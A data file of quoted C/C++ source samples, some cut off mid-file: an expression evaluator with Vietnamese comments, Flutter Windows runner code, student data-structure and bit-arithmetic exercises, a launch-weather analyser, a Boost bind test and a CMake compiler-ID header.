    "#include <iostream>\n#include <stack>\n#include <string>\n#include <sstream>\n\nusing namespace std;\n\n// Ki\u1ec3m tra xem m\u1ed9t k\u00fd t\u1ef1 c\u00f3 ph\u1ea3i l\u00e0 to\u00e1n t\u1eed hay kh\u00f4ng\nbool isOperator(char c) {\n    return (c == '+' || c == '-' || c == '*' || c == '/');\n}\n\n// Th\u1ef1c hi\u1ec7n ph\u00e9p to\u00e1n cho hai to\u00e1n h\u1ea1ng v\u00e0 m\u1ed9t to\u00e1n t\u1eed\ndouble performOperation(char op, double operand1, double operand2) {\n    switch (op) {\n        case '+':\n            return operand1 + operand2;\n        case '-':\n            return operand1 - operand2;\n        case '*':\n            return operand1 * operand2;\n        case '/':\n            if (operand2 != 0) // Ki\u1ec3m tra chia cho 0\n                return operand1 / operand2;\n            else {\n                cerr << \"Loi: chia cho 0\\n\";\n                exit(EXIT_FAILURE);\n            }\n        default:\n            cerr << \"Loi: toan tu khong hop le\\n\";\n            exit(EXIT_FAILURE);\n    }\n}\n\n// T\u00ednh to\u00e1n bi\u1ec3u th\u1ee9c s\u1ed1 h\u1ecdc\ndouble evaluateExpression(string expression) {\n    stack<double> operandStack; // Stack \u0111\u1ec3 l\u01b0u tr\u1eef c\u00e1c to\u00e1n h\u1ea1ng\n    stack<char> operatorStack; // Stack \u0111\u1ec3 l\u01b0u tr\u1eef c\u00e1c to\u00e1n t\u1eed\n\n    stringstream ss(expression);\n    string token;\n    while (getline(ss, token, ' ')) { // T\u00e1ch bi\u1ec3u th\u1ee9c th\u00e0nh c\u00e1c token\n        if (token.empty()) continue; // B\u1ecf qua c\u00e1c kho\u1ea3ng tr\u1eafng kh\u00f4ng c\u1ea7n thi\u1ebft\n\n        if (isdigit(token[0])) { // N\u1ebfu l\u00e0 to\u00e1n h\u1ea1ng\n            double operand = stod(token);\n            operandStack.push(operand);\n        } else if (isOperator(token[0])) { // N\u1ebfu l\u00e0 to\u00e1n t\u1eed\n            while (!operatorStack.empty() && \n                   operatorStack.top() != '(' &&\n                   ((token[0] != '*' && token[0] != '/') ||\n                   (operatorStack.top() != '+' && operatorStack.top() != '-'))) {\n                // Th\u1ef1c hi\u1ec7n ph\u00e9p to\u00e1n n\u1ebfu \u0111\u1ed9 \u01b0u ti\u00ean c\u1ee7a to\u00e1n t\u1eed tr\u00ean c\u00f9ng trong stack cao h\u01a1n\n                char op = operatorStack.top();\n                operatorStack.pop();\n\n                double operand2 = operandStack.top();\n                operandStack.pop();\n\n                double operand1 = operandStack.top();\n                operandStack.pop();\n\n                double result = performOperation(op, operand1, operand2);\n                operandStack.push(result);\n            }\n            operatorStack.push(token[0]);\n        } else if (token[0] == '(') { // N\u1ebfu l\u00e0 d\u1ea5u ngo\u1eb7c m\u1edf\n            operatorStack.push(token[0]);\n        } else if (token[0] == ')') { // N\u1ebfu l\u00e0 d\u1ea5u ngo\u1eb7c \u0111\u00f3ng\n            while (!operatorStack.empty() && operatorStack.top() != '(') {\n                char op = operatorStack.top();\n                operatorStack.pop();\n\n                double operand2 = operandStack.top();\n                operandStack.pop();\n\n                double operand1 = operandStack.top();\n                operandStack.pop();\n\n                double result = performOperation(op, operand1, operand2);\n                operandStack.push(result);\n            }\n            if (!operatorStack.empty() && operatorStack.top() == '(')\n                operatorStack.pop(); // Lo\u1ea1i b\u1ecf d\u1ea5u ngo\u1eb7c m\u1edf kh\u1ecfi stack\n        } else {\n            cerr << \"Loi: bieu thuc khong hop le\\n\";\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    // Th\u1ef1c hi\u1ec7n ph\u00e9p to\u00e1n c\u00f2n l\u1ea1i (n\u1ebfu c\u00f3)\n    while (!operatorStack.empty()) {\n        char op = operatorStack.top();\n        operatorStack.pop();\n\n        double operand2 = operandStack.top();\n        operandStack.pop();\n\n        double operand1 = operandStack.top();\n        operandStack.pop();\n\n        double result = performOperation(op, operand1, operand2);\n        operandStack.push(result);\n    }\n\n    // K\u1ebft qu\u1ea3 cu\u1ed1i c\u00f9ng l\u00e0 to\u00e1n h\u1ea1ng duy nh\u1ea5t c\u00f2n l\u1ea1i tr\u00ean stack\n    return operandStack.top();\n}\n\nint main() {\n    string expression;\n    cout << \"Nhap bieu thuc so hoc: \";\n    getline(cin, expression);\n\n    double result = evaluateExpression(expression);\n    cout << \"Ket qua: \" << result << endl;\n\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include \"ordered_array.hpp\"\n\nordered_array::ordered_array(int cap)\n{\n    this->cap = cap;\n    sz = 0;\n\n    data = new int[cap];\n}\n\nordered_array::~ordered_array()\n{\n    delete[] data;\n}\n\nint ordered_array::size()\n{\n    return sz;\n}\n\nint ordered_array::capacity()\n{\n    return cap;\n}\n\nvoid ordered_array::insert(int elem)\n{\n    // returns if the array is full\n    if (sz == cap)\n    {\n        return;\n    }\n\n    // return if the elem is min value\n    if (elem == -2147483648)\n    {\n        return;\n    }\n\n    // find pos where elem should be inserted\n    int i = 0;\n    while (i < sz && data[i] < elem)\n    {\n        i++;\n    }\n\n    //shift elem to the right\n    for (int j = sz; j > i; j--) \n    {\n        data[j] = data[j - 1];\n    }\n\n\n    // insert the new elem in correct position\n    data[i] = elem;\n    // increments the size of the array\n    sz++;\n\n}\n\nvoid ordered_array::remove(int elem)\n{\n    // shifting\n    // duplicates\n    // check if elem exixts or if arr is empty\n    if (!exists(elem) || sz == 0) {\n        return;\n    }\n\n    // 1 check if elem exists\n    // 2 find the first index of elem\n    int i;\n    for (i = 0; i < sz; ++i)\n    {\n        if (data[i] == elem)\n        {\n            break;\n        }\n    }\n\n\n    // 4 shift the array down\n    for (int j = i; j < sz - 1; j++) \n    {\n        data[j] = data[j + 1];\n    }\n\n    // decrement sz of array\n    sz--;\n\n}\n\nbool ordered_array::exists(int elem)\n{\n    for (int i = 0; i < sz; ++i)\n    {\n        if (data[i] == elem)\n        {\n            return true;\n        }\n    }\n    return false;\n}\n\nint &ordered_array::at(int i)\n{\n    // i<=0, i <sz\n   if (sz == 0) \n   {\n       throw std::out_of_range(\"Index out of range\");\n   } else if (i >= 0 && i < cap) \n   {\n       return data[i];\n   } else \n   {\n       throw std::out_of_range(\"Index out of range\");\n   }\n\n}\n",
    "#include <fstream>\r\n#include <iostream>\r\n#include <sstream>\r\n#include <string>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nvector<vector<string>> weatherConditions;\r\n\r\nconst int numberOfPorts = 5;\r\n\r\nstruct SpacePort {\r\n    int perfectDay = 0;\r\n    int lengthEquator = 0;\r\n    int lowestTemps = 1;\r\n    int maxTemps = 32;\r\n    int maxWindSpeed = 11;\r\n    int maxHumidity = 55;\r\n    int maxPrecipitation = 0;\r\n    string lightning = \"No\";\r\n    string cloudsFirst = \"Cumulus\";\r\n    string cloudsSecond = \"Nimbus\";\r\n    string csvFileName;\r\n    string name;\r\n\r\n};\r\n\r\nvoid CreateFile(vector<SpacePort> ports) {\r\n    ofstream outputFile(\"LaunchAnalysisReport.csv\");\r\n    if (!outputFile) {\r\n        cout << \"Error creating file\" << endl;\r\n        return;\r\n    }\r\n    outputFile << \"Port name,Date\" << endl;\r\n\r\n    for (size_t i = 0; i < numberOfPorts; i++) {\r\n        outputFile << ports[i].name << \",\";\r\n        if (ports[i].perfectDay == 0) {\r\n            outputFile << \"No viable shuffle day\" << endl;\r\n        }\r\n        else {\r\n            outputFile << ports[i].perfectDay << endl;\r\n        }\r\n    }\r\n    outputFile.close();\r\n}\r\n\r\nvoid GetWeatherConditions(const string fileName) {\r\n    ifstream File(fileName);\r\n    if (!File.is_open()) {\r\n        cout << \"Unable to open file\" << endl;\r\n        return;\r\n    }\r\n    string line;\r\n    string word;\r\n    while (getline(File, line)) {\r\n        stringstream ss(line);\r\n        vector<string> row;\r\n        getline(ss, word, ',');\r\n        while (getline(ss, word, ',')) {\r\n            row.push_back(word);\r\n        }\r\n        weatherConditions.push_back(row);\r\n    }\r\n    File.close();\r\n}\r\n\r\nint GetAppropriateDays(SpacePort port) {\r\n    const size_t numberOfDays = weatherConditions[0].size();\r\n\r\n    for (size_t i = 0; i < numberOfDays; i++) {\r\n        if (stoi(weatherConditions[1][i]) > port.lowestTemps &&\r\n            stoi(weatherConditions[1][i]) < port.maxTemps &&\r\n            stoi(weatherConditions[2][i]) < port.maxWindSpeed &&\r\n            stoi(weatherConditions[3][i]) < port.maxHumidity &&\r\n            stoi(weatherConditions[4][i]) == port.maxPrecipitation &&\r\n            weatherConditions[5][i] == port.lightning &&\r\n            weatherConditions[6][i] != port.cloudsFirst &&\r\n            weatherConditions[6][i] != port.cloudsSecond) {\r\n            return i + 1;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\nvoid GetBestDay(vector<SpacePort>& ports) {\r\n    int day = 0;\r\n    for (size_t i = 0; i < numberOfPorts;i++) {\r\n        GetWeatherConditions(ports[i].csvFileName);\r\n        day = GetAppropriateDays(ports[i]);\r\n        ports[i].perfectDay = day;\r\n        weatherConditions.clear();\r\n    }\r\n}\r\n\r\nvoid GetPerfectDayAndLocation(vector<SpacePort> ports) {\r\n    int port = -1;\r\n    int currentMaxLength = 999999;\r\n    for (size_t i = 0; i < numberOfPorts; i++) {\r\n        if (ports[i].perfectDay != 0 && ports[i].lengthEquator <= currentMaxLength) {\r\n            port = i;\r\n            currentMaxLength = ports[i].lengthEquator;\r\n        }\r\n    }\r\n    if (port != -1) {\r\n        cout << \"Perfect location and day:\" << endl;\r\n        cout << ports[port].name << \"  day: \" << ports[port].perfectDay;\r\n    }\r\n    else {\r\n        cout << \"There are no appropriate days\";\r\n    }\r\n}\r\n\r\n\r\n\r\nint main() {\r\n    string portNames[numberOfPorts] = { \"Kourou\", \"Tenegashima\", \"Cape Canaveral\", \"Mahia\", \"Kodiak\" };\r\n    int arr[numberOfPorts] = { 333, 1934, 1807, 2500, 4112 };\r\n    vector<SpacePort> spacePorts(numberOfPorts);\r\n\r\n    cout << \"Enter file path\" << endl;\r\n    string fileName;\r\n    getline(cin, fileName);\r\n\r\n    string choice;\r\n    cout << \"Do you want to use default weather criteria? (Yes/No): \";\r\n    cin >> choice;\r\n\r\n    SpacePort port;\r\n    for (size_t i = 0; i < numberOfPorts; i++) {\r\n        port.name = portNames[i];\r\n        port.csvFileName = fileName + \"\\\\\" + portNames[i] + \".csv\";\r\n        port.lengthEquator = arr[i];\r\n        spacePorts[i] = port;\r\n    }\r\n\r\n    if (choice == \"No\") {\r\n        int numberOfPortsToChange;\r\n        while (true) {\r\n            cout << \"How many port's criteria do you want to change?\" << endl;\r\n            cin >> numberOfPortsToChange;\r\n\r\n            if (numberOfPortsToChange > numberOfPorts && numberOfPortsToChange<0 && !numberOfPortsToChange) {\r\n                cout << \"Invalid input\" << endl;\r\n            }\r\n            else {\r\n                break;\r\n            }\r\n        }\r\n       \r\n            string portName;\r\n            bool isValid = false;\r\n            for (size_t j = 0; j < numberOfPortsToChange; j++) {\r\n                cout << \"Enter the name of the port to change criteria: \";\r\n                cin >> portName;\r\n\r\n                for (int i = 0; i < numberOfPorts; i++) {\r\n                    if (portName == portNames[i]) {\r\n                        cout << \"Enter lowest temperature: \";\r\n                        cin >> spacePorts[i].lowestTemps;\r\n\r\n                        cout << \"Enter maximum temperature: \";\r\n                        cin >> spacePorts[i].max",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#define BIT_VECTOR_LENGTH 4\n#define MSB_INDEX BIT_VECTOR_LENGTH - 1\n#define LSB_INDEX 0\n\nvoid print_command(char *argv[]);\nint check_validity(char *input);\nvoid init_bit_vector(char *input, char *bv);\nvoid print_bit_vector(char *bv);\n\nunsigned int b2u(char *bv);\nint b2s(char *bv);\nint b2o(char *bv);\nint b2t(char *bv);\n\nvoid bit_addition(char *bv1, char *bv2, char *result);\nunsigned int unsigned_addition(char *bv1, char *bv2);\nint twos_complement_addition(char *bv1, char *bv2);\nint ones_complement_addition(char *bv1, char *bv2);\nint sign_magnitude_addition(char *bv1, char *bv2);\n\n\nint main(int argc, char *argv[])\n{\n  char bv1[BIT_VECTOR_LENGTH];\n  char bv2[BIT_VECTOR_LENGTH];\n\n  if (argc != 3)\n  {\n    printf(\"Error: invalid number of arguments\\n\");\n    print_command(argv);\n  }\n\n  if (!(check_validity(argv[1]) && check_validity(argv[2])))\n  {\n    printf(\"Error: invalid arguments\\n\");\n    print_command(argv);\n  }\n\n  init_bit_vector(argv[1], bv1);\n  init_bit_vector(argv[2], bv2);\n  print_bit_vector(bv1);\n  printf(\" - b2u: %u\\n\", b2u(bv1));\n  printf(\" - b2s: %d\\n\", b2s(bv1));\n  printf(\" - b2o: %d\\n\", b2o(bv1));\n  printf(\" - b2t: %d\\n\", b2t(bv1));\n\n  print_bit_vector(bv2);\n  printf(\" - b2u: %u\\n\", b2u(bv2));\n  printf(\" - b2s: %d\\n\", b2s(bv2));\n  printf(\" - b2o: %d\\n\", b2o(bv2));\n  printf(\" - b2t: %d\\n\", b2t(bv2));\n\n  printf(\"Addition >>\\n\");\n  printf(\" - Unsigned addition: %u\\n\", unsigned_addition(bv1, bv2));\n  printf(\" - Sign magnitude addition: %d\\n\", sign_magnitude_addition(bv1, bv2));\n  printf(\" - One's complement addition: %d\\n\", ones_complement_addition(bv1, bv2));\n  printf(\" - Two's complement addition: %d\\n\", twos_complement_addition(bv1, bv2));\n\n  return 0;\n}\n\nvoid print_command(char *argv[])\n{\n  printf(\"Command: %s <first bit vector> <second bit vector>\\n\", argv[0]);\n  printf(\"Example: %s 0110 1000\\n\", argv[0]);\n  exit(1);\n}\n\nint check_validity(char *input)\n{\n  int i, len;\n  len = strlen(input);\n\n  if (len < BIT_VECTOR_LENGTH)\n  {\n    return 0;\n  }\n\n  for (i=0; i<len; i++)\n  {\n    if (!(input[i] == '0' || input[i] == '1'))\n      return 0;\n  }\n\n  return 1;\n}\n\nvoid init_bit_vector(char *input, char *bv)\n{\n  int i, len;\n  len = strlen(input);\n\n  for (i=0; i<len; i++)\n  {\n    if (input[i] == '0')\n      bv[BIT_VECTOR_LENGTH-i-1] = 0;\n    else\n      bv[BIT_VECTOR_LENGTH-i-1] = 1;\n  }\n}\n\nvoid print_bit_vector(char *bv)\n{\n  int i;\n  printf(\"Bit Vector >>\\n\");\n  for (i=MSB_INDEX; i>=LSB_INDEX; i--)\n  {\n    printf(\"%d\", bv[i]);\n  }\n  printf(\"\\n\");\n}\n\nunsigned int b2u(char *bv)\n{\n  unsigned int ret;\n  int i, power;\n\n  ret = 0;\n  power = 1;\n  for (i = LSB_INDEX; i<= MSB_INDEX; i++)\n    ret += bv[i] * (power << i);\n  return ret;\n}\n\nint b2s(char *bv)\n{\n  int i, ret, power;\n  ret = 0;\n  power = 1;\n\n  for (i = LSB_INDEX; i<MSB_INDEX; i++)\n    ret += bv[i] * (power << i);\n\n  if (bv[MSB_INDEX])\n    ret *= -1;\n\n  return ret;\n}\n\nint b2o(char *bv)\n{\n  int i, ret, power;\n  ret = 0;\n  power = 1;\n\n  ret = -1 * bv[MSB_INDEX] * ((power << MSB_INDEX) - 1);\n  for (i=LSB_INDEX; i<MSB_INDEX; i++)\n    ret += bv[i] * (power << i);\n\n  return ret;\n}\n\nint b2t(char *bv)\n{\n  int i, ret, power;\n  ret = 0;\n  power = 1;\n\n  ret = -1 * bv[MSB_INDEX] * (power << MSB_INDEX);\n  for (i=LSB_INDEX; i<MSB_INDEX; i++)\n    ret += bv[i] * (power << i);\n\n  return ret;\n}\n\nvoid bit_addition(char *bv1, char *bv2, char *result)\n{\n  int i, tmp;\n  char carry[BIT_VECTOR_LENGTH+1];\n\n  for (i=LSB_INDEX; i<=MSB_INDEX; i++)\n  {\n    tmp = bv1[i] + bv2[i] + carry[i];\n\n    switch (tmp)\n    {\n      case 0:\n        result[i] = 0;\n        carry[i+1] = 0;\n        break;\n\n      case 1:\n        result[i] = 1;\n        carry[i+1] = 0;\n        break;\n\n      case 2:\n        result[i] = 0;\n        carry[i+1] = 1;\n        break;\n\n      case 3:\n        result[i] = 1;\n        carry[i+1] = 1;\n        break;\n    }\n  }\n}\n\n\nunsigned int unsigned_addition(char *bv1, char *bv2)\n{\n  char result[BIT_VECTOR_LENGTH];\n  bit_addition(bv1, bv2, result);\n  return b2u(result);\n}\n\nint sign_magnitude_addition(char *bv1, char *bv2)\n{\n  char result[BIT_VECTOR_LENGTH];\n  bit_addition(bv1, bv2, result);\n  return b2s(result);\n}\n\nint ones_complement_addition(char *bv1, char *bv2)\n{\n  char result[BIT_VECTOR_LENGTH];\n  bit_addition(bv1, bv2, result);\n  return b2o(result);\n}\n\nint twos_complement_addition(char *bv1, char *bv2)\n{\n  char result[BIT_VECTOR_LENGTH];\n  bit_addition(bv1, bv2, result);\n  return b2t(result);\n}\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"splash_screen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <map>\n#include \"bst.h\"\n#include \"avlbst.h\"\n\nusing namespace std;\n\n\nint main(int argc, char *argv[])\n{\n    // Binary Search Tree tests\n    BinarySearchTree<char,int> bt;\n    bt.insert(std::make_pair('a',1));\n    bt.insert(std::make_pair('b',2));\n    \n    cout << \"Binary Search Tree contents:\" << endl;\n    for(BinarySearchTree<char,int>::iterator it = bt.begin(); it != bt.end(); ++it) {\n        cout << it->first << \" \" << it->second << endl;\n    }\n    if(bt.find('b') != bt.end()) {\n        cout << \"Found b\" << endl;\n    }\n    else {\n        cout << \"Did not find b\" << endl;\n    }\n    cout << \"Erasing b\" << endl;\n    bt.remove('b');\n\n    // AVL Tree Tests\n    AVLTree<char,int> at;\n    at.insert(std::make_pair('a',1));\n    at.insert(std::make_pair('b',2));\n\n    cout << \"\\nAVLTree contents:\" << endl;\n    for(AVLTree<char,int>::iterator it = at.begin(); it != at.end(); ++it) {\n        cout << it->first << \" \" << it->second << endl;\n    }\n    if(at.find('b') != at.end()) {\n        cout << \"Found b\" << endl;\n    }\n    else {\n        cout << \"Did not find b\" << endl;\n    }\n    cout << \"Erasing b\" << endl;\n    at.remove('b');\n\n    return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <boost/config.hpp>\n\n#if defined(BOOST_MSVC)\n#pragma warning(disable: 4786)  // identifier truncated in debug info\n#pragma warning(disable: 4710)  // function not inlined\n#pragma warning(disable: 4711)  // function selected for automatic inline expansion\n#pragma warning(disable: 4514)  // unreferenced inline removed\n#endif\n\n//\n//  bind_void_mf_test.cpp - test for bind<void> with member functions\n//\n//  Copyright (c) 2008 Peter Dimov\n//  Copyright (c) 2014 Agustin Berge\n//\n// Distributed under the Boost Software License, Version 1.0. (See\n// accompanying file LICENSE_1_0.txt or copy at\n// http://www.boost.org/LICENSE_1_0.txt)\n//\n\n#include <boost/bind/bind.hpp>\n#include <boost/ref.hpp>\n#include <boost/core/lightweight_test.hpp>\n\nusing namespace boost::placeholders;\n\n//\n\nstruct Z\n{\n    int m;\n};\n\nvoid member_data_test()\n{\n    Z z = { 17041 };\n    Z * pz = &z;\n\n    boost::bind<void>( &Z::m, _1 )( z );\n    boost::bind<void>( &Z::m, _1 )( pz );\n\n    boost::bind<void>( &Z::m, z )();\n    boost::bind<void>( &Z::m, pz )();\n    boost::bind<void>( &Z::m, boost::ref(z) )();\n\n\n    Z const cz = z;\n    Z const * pcz = &cz;\n\n    boost::bind<void>( &Z::m, _1 )( cz );\n    boost::bind<void>( &Z::m, _1 )( pcz );\n\n    boost::bind<void>( &Z::m, cz )();\n    boost::bind<void>( &Z::m, pcz )();\n    boost::bind<void>( &Z::m, boost::ref(cz) )();\n}\n\nint main()\n{\n    member_data_test();\n\n    return boost::report_errors();\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# 